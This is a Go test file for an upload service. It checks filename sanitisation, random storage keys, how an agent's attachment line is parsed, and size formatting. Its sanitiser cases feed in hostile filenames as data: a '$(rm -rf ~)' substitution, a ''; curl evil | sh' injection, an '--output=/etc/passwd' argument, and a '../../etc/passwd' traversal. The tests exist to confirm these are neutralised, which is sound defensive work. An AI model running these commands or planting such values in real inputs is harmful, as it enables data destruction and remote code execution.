package uploads

import (
	"strings"
	"testing"
)

// TestSafeNameIsShellAndHeaderSafe: what reaches an agent's shell line and a
// Content-Disposition header holds only [A-Za-z0-9._-], never starts with a
// dot or a dash, and keeps a readable name.
func TestSafeNameIsShellAndHeaderSafe(t *testing.T) {
	for in, want := range map[string]string{
		"screenshot.png":                  "screenshot.png",
		"Screen Shot 2026-10-17 at 9.png": "Screen_Shot_2026-10-17_at_9.png",
		"$(rm -rf ~).png":                 "rm_-rf_.png",
		"'; curl evil | sh; '.txt":        "curl_evil_sh_.txt",
		"-rf":                             "rf",
		"--output=/etc/passwd":            "output_etc_passwd",
		".bashrc":                         "bashrc",
		"résumé.pdf":                      "r_sum_.pdf",
		"":                                "file",
		"...":                             "file",
		"日本語":                             "file",
		// A stem that was ALL non-ASCII keeps its extension.
		"報告.pdf":     "file.pdf",
		"отчёт.docx": "file.docx",
	} {
		if got := SafeName(in); got != want {
			t.Errorf("SafeName(%q) = %q; want %q", in, got, want)
		}
	}
	long := strings.Repeat("a", 200) + ".tar.gz"
	got := SafeName(long)
	if len(got) != maxSafeName || !strings.HasSuffix(got, ".gz") {
		t.Errorf("SafeName(200 a's.tar.gz) = %q (%d); want %d chars ending .gz", got, len(got), maxSafeName)
	}
}

// TestCleanFilenameKeepsOnlyTheLastElement: no path survives into the stored
// name, and control characters are dropped.
func TestCleanFilenameKeepsOnlyTheLastElement(t *testing.T) {
	for in, want := range map[string]string{
		"../../etc/passwd":      "passwd",
		`C:\Users\me\shot.png`:  "shot.png",
		"a\x00b\x07c\u202e.png": "abc.png",
		"/":                     "file",
		"":                      "file",
		"  spaced name.txt  ":   "spaced name.txt",
	} {
		if got := CleanFilename(in); got != want {
			t.Errorf("CleanFilename(%q) = %q; want %q", in, got, want)
		}
	}
	if got := CleanFilename(strings.Repeat("é", 300)); len(got) > maxFilenameBytes {
		t.Errorf("CleanFilename kept %d bytes; cap is %d", len(got), maxFilenameBytes)
	}
}

// TestObjectKeysAreRandomAndCarryNoName: 1000 ids are distinct, well formed,
// and the key is the id with a fixed prefix — nothing of a filename.
func TestObjectKeysAreRandomAndCarryNoName(t *testing.T) {
	seen := map[string]bool{}
	for i := 0; i < 1000; i++ {
		id, err := NewPublicID()
		if err != nil {
			t.Fatal(err)
		}
		if !ValidPublicID(id) {
			t.Fatalf("NewPublicID() = %q, which ValidPublicID refuses", id)
		}
		if seen[id] {
			t.Fatalf("NewPublicID repeated %q after %d", id, i)
		}
		seen[id] = true
		if k := ObjectKeyFor(id); k != "uploads/"+id {
			t.Fatalf("ObjectKeyFor(%q) = %q", id, k)
		}
	}
}

// TestAnAgentLineRoundTripsThroughFindRefs: what AgentLine writes, FindRefs
// reads back at the right offsets, inside other text and next to another.
func TestAnAgentLineRoundTripsThroughFindRefs(t *testing.T) {
	s := mustSigner(t, testKey)
	url1 := s.URL("https://muster.example.test", sid, timeAt(1_900_000_000))
	id2 := "Zz_-0123456789abcdefgh"
	url2 := s.URL("http://localhost:18181", id2, timeAt(1_900_000_001))
	l1 := AgentLine("shot.png", "image/png", 319_488, url1)
	l2 := AgentLine("notes.txt", "text/plain; charset=utf-8", 12, url2)
	if want := "[attached: shot.png (image/png, 312 KB) " + url1 + " — download with curl -sSfo shot.png '" + url1 + "']"; l1 != want {
		t.Fatalf("AgentLine =\n  %q\nwant\n  %q", l1, want)
	}
	msg := "please look at these\n" + l1 + "\n" + l2
	refs := FindRefs(msg)
	if len(refs) != 2 {
		t.Fatalf("FindRefs found %d; want 2 in %q", len(refs), msg)
	}
	if r := refs[0]; r.Name != "shot.png" || r.ContentType != "image/png" || r.Size != "312 KB" || r.URL != url1 || r.PublicID != sid ||
		msg[r.Start:r.End] != l1 || !r.IsImage() {
		t.Errorf("first ref = %+v", r)
	}
	if r := refs[1]; r.PublicID != id2 || r.ContentType != "text/plain; charset=utf-8" || msg[r.Start:r.End] != l2 || r.IsImage() {
		t.Errorf("second ref = %+v", r)
	}
	// Not a line: a bare signed URL, and a line whose URL is not a /f/ link.
	for _, text := range []string{url1, strings.Replace(l1, "/f/", "/x/", 2), strings.Replace(l1, "sig=", "sog=", 2)} {
		if got := FindRefs(text); len(got) != 0 {
			t.Errorf("FindRefs(%q) = %+v; want none", text, got)
		}
	}
}

func TestHumanSize(t *testing.T) {
	for n, want := range map[int64]string{0: "0 B", 1023: "1023 B", 1024: "1 KB", 319_488: "312 KB", 5 << 20: "5.0 MB", 25<<20 - 1: "25.0 MB"} {
		if got := HumanSize(n); got != want {
			t.Errorf("HumanSize(%d) = %q; want %q", n, got, want)
		}
	}
}
